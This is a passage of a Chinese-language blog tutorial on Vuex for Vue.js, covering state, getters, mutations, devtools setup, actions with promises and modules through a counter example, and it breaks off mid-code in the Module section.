        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>以下内容结合<a href="https://vuex.vuejs.org/zh/" target="_blank" rel="noopener">官方文档</a></p><blockquote><p>Vuex 是一个专为 Vue.js 应用程序开发的<strong>状态管理模式</strong>。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化</p></blockquote><p><strong>状态管理模式：</strong></p><p>下面是单个组件的数据管理方式⬇</p><p>状态自管理应用包含以下几个部分：</p><ul><li><strong>state</strong>，驱动应用的数据源；（就是相当于组件内定义的data）</li><li><strong>view</strong>，以声明方式将 <strong>state</strong> 映射到视图；（将数据呈现到视图上，便是view）</li><li><strong>actions</strong>，响应在 <strong>view</strong> 上的用户输入导致的状态变化。（当用户点击某个操作使数据发生改变时）</li></ul><p>下面是表示“单向数据流”理念的简单示意图</p><p><img src= "/img/loading.gif" data-src="https://vuex.vuejs.org/flow.png" alt="img"></p><p>但是，当我们的应用遇到<strong>多个组件共享状态</strong>时，单向数据流的简洁性很容易被破坏：</p><ul><li>多个视图依赖于同一状态。</li><li>来自不同视图的行为需要变更同一状态。</li></ul><p>对于问题一，传参的方法对于多层嵌套的组件将会非常繁琐，并且对于兄弟组件间的状态传递无能为力。对于问题二，我们经常会采用父子组件直接引用或者通过事件来变更和同步状态的多份拷贝。以上的这些模式非常脆弱，通常会导致无法维护的代码。</p><p>因此，我们为什么不把组件的共享状态抽取出来，以一个全局单例模式管理呢？在这种模式下，我们的组件树构成了一个巨大的“视图”，不管在树的哪个位置，任何组件都能获取状态或者触发行为！</p><p>通过定义和隔离状态管理中的各种概念并通过强制规则维持视图和状态间的独立性，我们的代码将会变得更结构化且易维护。</p><blockquote><p>也就是说，当各自的组件都有各自的数据并不希望被别的组件访问时，可以使用自己的data属性去定义，去存储（自己的小房间），当多个组件都要共享一个状态（state）时，那么，你就要一个“状态管理管家”去帮你管理这些数据，这便是vuex</p></blockquote><p>下面是官方图</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%83%E3%80%81Vuex%E5%85%A5%E9%97%A8/vuex.png" alt></p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>通过vuex管理一个加减器案例</p><p>首先就是用脚手架搭建我们的项目了，记得把vuex勾选上(忘记了也可以在后面npm安装上)</p><p>然后就是界面代码的书写，在app.vue中进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123;this.$store.state.count&#125;&#125;&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;increase()&quot;&gt;+&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;reduce()&quot;&gt;-&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      &#x2F;&#x2F; message: this.$store.state.count &#x2F;&#x2F;获取vuex中的状态</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">    increase() &#123;</span><br><span class="line">      this.$store.commit(&quot;increase&quot;) &#x2F;&#x2F;注意是字符串格式</span><br><span class="line">    &#125;,</span><br><span class="line">    reduce() &#123;</span><br><span class="line">      this.$store.commit(&quot;reduce&quot;) </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>在store文件夹中，你会发现有一个index.js文件，它就是vuex状态管理的主文件，好的，让我们把它删了，重新创建一个，自己梳理并创建vuex</p><p>下面是vuex的基本创建代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//安装插件</span></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="comment">//新建实例</span></span><br><span class="line"><span class="keyword">const</span> Store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Store</span><br></pre></td></tr></table></figure><p>然后就是在新建的vuex实例中去定义我们的state和mutations，来为刚才的组件定义状态管理的具体实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//状态管理</span></span><br><span class="line">state: &#123;</span><br><span class="line">  count: <span class="number">100</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">//行为管理</span></span><br><span class="line">mutations: &#123;</span><br><span class="line">  increase(state) &#123;</span><br><span class="line">    state.count ++</span><br><span class="line">  &#125;,</span><br><span class="line">  reduce(state) &#123;</span><br><span class="line">    state.count --</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这里有一个注意点</strong>：虽然我们可以在组件中通过自定义方法（method）的方式去改变state的值，但是官方不推荐这样做，这样会破坏状态的统一管理（Vuex可以更明确的追踪状态的变化，所以不要直接在其它地方改变store.state中的值）</p><h1 id="devtools"><a href="#devtools" class="headerlink" title="devtools"></a>devtools</h1><blockquote><p>简介：vue-devtools是一款基于chrome游览器的插件，用于调试vue应用，这可以极大地提高我们的调试效率。</p></blockquote><p>安装</p><ol><li>有能力者可以直接上google chrome商店去安装该插件</li><li><a href="https://chrome.zzzmh.cn/info?token=nhdogjmejiglipccpnnnanhbledajbpd" target="_blank" rel="noopener">极简插件</a>按照安装指示中去安装该插件</li><li>通过npm</li></ol><p>下面具体介绍通过npm</p><p>首先去到该插件的<a href="https://github.com/vuejs/vue-devtools" target="_blank" rel="noopener">官方GitHub</a>，然后下载该分支下的所选版本</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%83%E3%80%81Vuex%E5%85%A5%E9%97%A8/image-20201027090026653.png" alt="image-20201027090026653"></p><p>可以直接右边<code>Code</code>下载，有git的也可以在本地电脑上<code>clone</code>下载</p><p>然后解压（clone的可以直接跳过这一步），之后在该文件夹下执行<code>npm i</code></p><p>安装完相应依赖后，执行<code>npm run build</code></p><p>然后找到文件夹下的shell文件夹中的chrome，在chrome/edge中扩展该插件</p><blockquote><p>注意：目前只能安装5.1.1版本（自己试的）</p></blockquote><h1 id="State单一状态树"><a href="#State单一状态树" class="headerlink" title="State单一状态树"></a>State单一状态树</h1><blockquote><p>Vuex 使用<strong>单一状态树</strong>——是的，用一个对象就包含了全部的应用层级状态。至此它便作为一个“唯一数据源 (<a href="https://en.wikipedia.org/wiki/Single_source_of_truth" target="_blank" rel="noopener">SSOT</a>)”而存在。这也意味着，每个应用将仅仅包含一个 store 实例。单一状态树让我们能够直接地定位任一特定的状态片段，在调试的过程中也能轻易地取得整个当前应用状态的快照。</p></blockquote><p>我们希望多个组件可以共享一个状态，如果我们在每个组件都定义的话，这会变得更加麻烦，并且，如何让它们共享动态改变的状态也是一个困难的点，所以vuex提供了store来为我们统一管理这些状态，通过store中的state属性，我们就可以很方便的管理这些状态了</p><p>但是：使用 Vuex 并不意味着你需要将<strong>所有的</strong>状态放入 Vuex。虽然将所有的状态放到 Vuex 会使状态变化更显式和易调试，但也会使代码变得冗长和不直观。如果有些状态严格属于单个组件，最好还是作为组件的局部状态。你应该根据你的应用开发需要进行权衡和确定</p><p>并且，正如其名，官方只推荐定义一个store去管理这些状态，否则后期维护会变得更加麻烦</p><h1 id="Getters"><a href="#Getters" class="headerlink" title="Getters"></a>Getters</h1><blockquote><p>Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。</p></blockquote><p>store对象中定义getters</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getters: &#123;</span><br><span class="line">  <span class="comment">//如果要定义参数，则要返回一个函数</span></span><br><span class="line">  <span class="comment">//参数可以定义getters来访问其它getter</span></span><br><span class="line">  more20(state) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = state.students.filter(<span class="function"><span class="params">n</span> =&gt;</span> n.age &gt;= <span class="number">20</span>)</span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line">    <span class="comment">// return function(a) &#123;</span></span><br><span class="line">    <span class="comment">//   let result = state.students.filter(n =&gt; n.age &gt;= 20)</span></span><br><span class="line">    <span class="comment">//   return result + a        </span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>app.vue中使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;&#123;&#123;this.$store.getters.more20&#125;&#125;&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure><p>如果想向getter传参数的话，则在getter里面返回一个函数</p><h1 id="Mutations"><a href="#Mutations" class="headerlink" title="Mutations"></a>Mutations</h1><p>更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 <strong>事件类型 (type)</strong> 和 一个 <strong>回调函数 (handler)</strong>。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 state 作为第一个参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新建并导出Store对象</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: <span class="number">100</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increase(state) &#123;</span><br><span class="line">      state.count ++</span><br><span class="line">    &#125;,</span><br><span class="line">    reduce(state) &#123;</span><br><span class="line">      state.count --</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>app.vue调用该方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">methods:&#123;</span><br><span class="line">  increase() &#123;</span><br><span class="line">    <span class="keyword">this</span>.$store.commit(<span class="string">"increase"</span>) <span class="comment">//注意是字符串格式</span></span><br><span class="line">  &#125;,</span><br><span class="line">  reduce() &#123;</span><br><span class="line">    <span class="keyword">this</span>.$store.commit(<span class="string">"reduce"</span>) </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想自定义传递参数的话，可以这样做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methods:&#123;</span><br><span class="line">  increase5() &#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="number">5</span></span><br><span class="line">    <span class="keyword">this</span>.$store.commit(<span class="string">"increase5"</span>, data)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在store中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新建并导出Store对象</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: <span class="number">100</span></span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    <span class="comment">//可以通过组件的commit('方法名',参数)，来为状态管理中的方法传递参数</span></span><br><span class="line">    increase5(state,data) &#123;</span><br><span class="line">      state.count += data</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个传入的data，实际为mutation的载荷，称作提交载荷（payload）</p><p>在大多数情况下，载荷最好是对象，这样可以包含多个字段并且记录的 mutation 会更易读：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutations: &#123;</span><br><span class="line">    increase5(state,payload) &#123;</span><br><span class="line">      state.count += payload.data</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methods:&#123;</span><br><span class="line">  increase5() &#123;</span><br><span class="line">    <span class="keyword">this</span>.$store.commit(<span class="string">"increase5"</span>, &#123;</span><br><span class="line">    data: <span class="number">5</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="提交风格"><a href="#提交风格" class="headerlink" title="提交风格"></a>提交风格</h2><p>对象风格</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">increase5() &#123;</span><br><span class="line">   <span class="keyword">let</span> data = <span class="number">5</span></span><br><span class="line">   <span class="keyword">this</span>.$store.commit(&#123;</span><br><span class="line">     type: <span class="string">"increase5"</span>, </span><br><span class="line">     data</span><br><span class="line">   &#125;)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里的data在mutation那里依旧会变成payload对象，mutation格式依旧不变</p><h2 id="数据响应式原理"><a href="#数据响应式原理" class="headerlink" title="数据响应式原理"></a>数据响应式原理</h2><p>Vuex的store中的state是响应式的, 当state中的数据发生改变时, Vue组件会自动更新.</p><p>这就要求我们必须遵守一些Vuex对应的规则:</p><ul><li>提前在store中初始化好所需的属性.</li><li>当给state中的对象添加新属性时, 使用下面的方式:<ol><li>使用Vue.set(obj, key, value)   （推荐）</li><li>用新对象给旧对象重新赋值</li></ol></li></ul><p>当我们想为state中的对象数据进行添加属性的时候，你可能会这样做</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getters: &#123;</span><br><span class="line">  changedata(state) &#123;</span><br><span class="line">    state.students[<span class="number">0</span>][<span class="string">'height'</span>] = <span class="number">1.88</span> <span class="comment">//添加height属性</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>student的原有定义数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">state: &#123;</span><br><span class="line">  count: <span class="number">100</span>,</span><br><span class="line">  students: [</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">'a'</span>,</span><br><span class="line">    age: <span class="number">15</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">'b'</span>,</span><br><span class="line">    age: <span class="number">20</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">'c'</span>,</span><br><span class="line">    age: <span class="number">30</span></span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，给组件绑定这一事件，之后运行一下，你会发现，数据没有更新，准确的来说，应该是视图界面上的数据并没有更新，打开vue控制台，在vuex选项中你会发现，数据是更新了，但它就是不出来。</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%83%E3%80%81Vuex%E5%85%A5%E9%97%A8/image-20201028103508241.png" alt="image-20201028103508241"></p><p>如何解决这个问题，就是用上面的方法去增加属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.set(state.students[<span class="number">0</span>],<span class="string">'height'</span>,<span class="number">1.88</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%83%E3%80%81Vuex%E5%85%A5%E9%97%A8/image-20201028103412118.png" alt="image-20201028103412118"></p><h2 id="类型常量"><a href="#类型常量" class="headerlink" title="类型常量"></a>类型常量</h2><p>当我们给vuex添加mutation时，不可避免的，我们也需要到相对应的组件去使用这些方法，当方法越来越多时，我们就需要去将这些方法名一一对应，使得组件的方法名能和store对应起来，那么这个过程，我们就可能因为一两个看错而导致代码出错的问题，vue推荐我们使用类型常量去代替<strong>Mutation事件的类型</strong>,具体操作方法如下</p><ol><li><p>在store文件夹中定义一个mutation-type.js文件去定义我们的常量</p></li><li><p>然后如下图所示，定义一个常量名，然后在组件和需要定义mutation文件中去引入该文件，之后就可以愉快的书写代码了，妈妈再也不用担心我的代码出错了，就算出错了，也有桥梁将它们联系起来，将错就错（嘿嘿）</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%83%E3%80%81Vuex%E5%85%A5%E9%97%A8/image-20201028105649059.png" alt="image-20201028105649059"></p></li></ol><h2 id="mutation同步函数"><a href="#mutation同步函数" class="headerlink" title="mutation同步函数"></a>mutation同步函数</h2><blockquote><p>通常情况下, Vuex要求我们Mutation中的方法必须是同步方法.</p><p>主要的原因是当我们使用devtools时, devtools可以帮助我们捕捉mutation的动作.</p><p>但是如果是异步操作, 那么devtools将不能很好的追踪这个操作什么时候会被完成.</p></blockquote><p>如果你在mutations定义了一个异步函数，那么，运行在devtools中你会发现，与这个异步操作关联的state中的数据并没有发生改变</p><h1 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h1><blockquote><p>Action 类似于 mutation，不同在于：</p><ul><li>Action 提交的是 mutation，而不是直接变更状态。</li><li>Action 可以包含任意异步操作。</li></ul></blockquote><p>他在定义上和mutation唯一的不同就是，它可以使用异步函数</p><blockquote><p>Action 函数接受一个与 store 实例具有相同方法和属性的 context 对象，因此你可以调用 <code>context.commit</code> 提交一个 mutation，或者通过 <code>context.state</code> 和 <code>context.getters</code> 来获取 state 和 getters。</p></blockquote><p>但是要注意的是：context并不就是store，后面在讲module就会说他们的区别</p><p>下面展示了在vuex中如何定义actions并在异步中调用mutation方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mutations: &#123;</span><br><span class="line">  increase5(state,payload) &#123;</span><br><span class="line">    state.count += payload.data</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,  </span><br><span class="line">actions: &#123;</span><br><span class="line">  increase5(context,payload) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    context.commit(<span class="string">'increase5'</span>,payload)</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在组件中的使用和mutation并不相同，它不是用commit()去调用该函数，而是通过dispatch()去调用该函数，同样，你可以给它传递参数，之后如上面代码所示，传递给mutations</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">increase5() &#123;</span><br><span class="line">  <span class="keyword">let</span> data = <span class="number">5</span></span><br><span class="line">  <span class="keyword">this</span>.$store.dispatch(&#123;</span><br><span class="line">    type: <span class="string">"increase5"</span>, </span><br><span class="line">    data</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h2><p>同样的，我们可以利用学过的promise对其进行完善，从而确定异步函数是否正确执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">actions: &#123;</span><br><span class="line">  <span class="comment">// promise版本</span></span><br><span class="line">  increase5(context,payload) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        context.commit(<span class="string">'increase5'</span>,payload)</span><br><span class="line">        resolve(<span class="string">'调用成功'</span>)</span><br><span class="line">      &#125;,<span class="number">1000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">increase5() &#123;</span><br><span class="line">  <span class="keyword">let</span> data = <span class="number">5</span></span><br><span class="line">  <span class="keyword">this</span>.$store.dispatch(&#123;</span><br><span class="line">    type: <span class="string">"increase5"</span>, </span><br><span class="line">    data</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">    <span class="keyword">let</span> a = <span class="string">'aaa'</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h1 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h1><p>参照<a href="https://vuex.vuejs.org/zh/guide/modules.html" target="_blank" rel="noopener">官网</a></p><blockquote><p>由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。</p><p>为了解决以上问题，Vuex 允许我们将 store 分割成<strong>模块（module）</strong>。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  state: <span class="function"><span class="params">()</span> =&gt;</span> (&#123; ... &#125;),</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;,</span><br><span class="line">  getters: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> moduleB = &#123;</span><br><span class="line">  state: <span class="function"><span class="params">()</span> =&gt;</span> (&#123; ... &#125;),</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  modules: &#123;</span><br><span class="line">    a: moduleA,</span><br><span class="line">    b: moduleB</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.state.a <span class="comment">// -&gt; moduleA 的状态</span></span><br><span class="line">store.state.b <span class="comment">// -&gt; moduleB 的状态</span></span><br></pre></td></tr></table></figure><h3 id="模块的局部状态"><a href="#模块的局部状态" class="headerlink" title="模块的局部状态"></a>模块的局部状态</h3><p>对于模块内部的 mutation 和 getter，接收的第一个参数是<strong>模块的局部状态对象</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  state: <span class="function"><span class="params">()</span> =&gt;</span> (&#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;),</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      <span class="comment">// 这里的 `state` 对象是模块的局部状态</span></span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  getters: &#123;</span><br><span class="line">    doubleCount (state) &#123;</span><br><span class="line">      <span class="keyword">return</span> state.count * <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，对于模块内部的 action，局部状态通过 <code>context.state</code> 暴露出来，根节点状态则为 <code>context.rootState</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  <span class="comment">// 